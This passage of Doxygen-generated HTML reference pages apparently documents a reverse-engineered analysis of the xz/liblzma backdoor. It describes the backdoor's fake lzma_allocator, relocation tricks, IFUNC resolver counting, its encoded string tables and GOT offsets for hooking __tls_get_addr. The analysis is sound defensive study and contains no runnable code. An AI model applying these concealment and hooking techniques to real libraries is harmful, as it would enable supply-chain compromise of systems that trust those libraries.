          <td class="memname"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a> <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains a fake lzma_allocator </p>
<p>the fake lzma_allocator makes lzma_alloc() call <a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584" title="a fake alloc function called by lzma_alloc() that then calls elf_symbol_get_addr()">fake_lzma_alloc()</a></p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>lzma_allocator::alloc is the address of <a class="el" href="xzre_8h.html#aeb6b7e7363a9d706fdd3704ef5faf584" title="a fake alloc function called by lzma_alloc() that then calls elf_symbol_get_addr()">fake_lzma_alloc()</a> the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_alloc</p>
<p>lzma_allocator::free is the address of <a class="el" href="xzre_8h.html#a5565761b59b3ef6786b83a9b50f72b17" title="a fake free function called by lzma_free()">fake_lzma_free()</a> the field maps to a relocation entry of type R_X86_64_64 and value fake_lzma_free</p>
<p>lzma_allocator::opaque is the address of <a class="el" href="xzre_8h.html#a52d510f0bbb31de19d8d20bf1acaeb5f" title="disassembles the given x64 code">x86_dasm()</a> the field maps to a relocation entry of type R_X86_64_64 and value x86_dasm </p>

</div>
</div>
<a id="aaab5bc3cf0e40bb0aa5bc72a3fd05fbe"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aaab5bc3cf0e40bb0aa5bc72a3fd05fbe">&#9670;&nbsp;</a></span>fake_lzma_allocator_offset</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const ptrdiff_t fake_lzma_allocator_offset</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .data.rel.ro section that contains the offset to fake_lzma_allocator_struct </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>the variable maps to a relocation entry of type R_X86_64_GOTOFF64 and value cpuid_random_symbol-0x180</p>
<p>used by <a class="el" href="xzre_8h.html#a45b23f67e591074c22a0691a6b5aced5" title="gets the address of the fake LZMA allocator">get_lzma_allocator_address()</a> </p>

</div>
</div>
<a id="a32c97a88bc607d3f2459f0d7d420099d"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a32c97a88bc607d3f2459f0d7d420099d">&#9670;&nbsp;</a></span>hooks_data_addr</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data_t</a>* hooks_data_addr</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>location of backdoor_hooks_data_t </p>
<p>set in <a class="el" href="xzre_8h.html#a1fcba1b3d069ccf76ee3cef4a3b9a682" title="scans loaded libraries to identify interesting libraries and populate related data">process_shared_libraries_map()</a> to a location in the spare bytes after the last liblzma data segment </p>

</div>
</div>
<a id="ab9c7b9765c15a48fbed3d1a8daf1b27f"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ab9c7b9765c15a48fbed3d1a8daf1b27f">&#9670;&nbsp;</a></span>resolver_call_count</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">u32 resolver_call_count</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>counts the number of times the IFUNC resolver is called </p>
<p>used by <a class="el" href="xzre_8h.html#a247a9d52e67096a060b99f0eb6dd4ca6" title="calls backdoor_init_stage2 by disguising it as a call to cpuid.">backdoor_init()</a> </p>

</div>
</div>
<a id="a53450f0faa9d81b24f8cee5731b51a58"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a53450f0faa9d81b24f8cee5731b51a58">&#9670;&nbsp;</a></span>string_action_data</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u32 string_action_data[1304]</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>contains action data for the encoded string radix tree </p>
<p>inside a .rodata section</p>
<p>used by <a class="el" href="xzre_8h.html#a6189320317764e3344934873b58b30b1" title="Get the.">get_string_id()</a> </p>

</div>
</div>
<a id="a8c67ac851c8ec7f40c406b286233f98e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8c67ac851c8ec7f40c406b286233f98e">&#9670;&nbsp;</a></span>string_mask_data</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u64 string_mask_data[238]</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>contains mask data for the encoded string radix tree </p>
<p>inside a .rodata section</p>
<p>used by <a class="el" href="xzre_8h.html#a6189320317764e3344934873b58b30b1" title="Get the.">get_string_id()</a> </p>

</div>
</div>
<a id="a3101b150fe0226a632314e2fa473aba1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a3101b150fe0226a632314e2fa473aba1">&#9670;&nbsp;</a></span>tls_get_addr_random_symbol</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const u64 tls_get_addr_random_symbol</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>a bogus global variable that is used by the backdoor to generate an extra symbol </p>
<p>inside a .rodata section</p>
<p>the symbol is used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> </p>

</div>
</div>
<a id="aadd306e1b2b33d0306f1995e0a83dae7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aadd306e1b2b33d0306f1995e0a83dae7">&#9670;&nbsp;</a></span>tls_get_addr_reloc_consts</h2>

<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">const <a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts_t</a> tls_get_addr_reloc_consts</td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">extern</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

<p>special .rodata section that contains __tls_get_addr() related GOT offsets </p>
<p>liblzma_la-crc64-fast.o lists the fields in the relocation table so that the linker fills out the fields with the offsets</p>
<p>used by <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a> and <a class="el" href="xzre_8h.html#ae20580c7a069afb3b578f060582867df" title="get the tls_get_addr_random_symbol GOT offset">get_tls_get_addr_random_symbol_got_offset()</a> </p>

</div>
</div>
</div><!-- contents -->
<!-- start footer part -->
<hr class="footer"/><address class="footer"><small>
Generated by&#160;<a href="https://www.doxygen.org/index.html"><img class="footer" src="doxygen.svg" width="104" height="31" alt="doxygen"/></a> 1.9.1
</small></address>
</body>
</html>
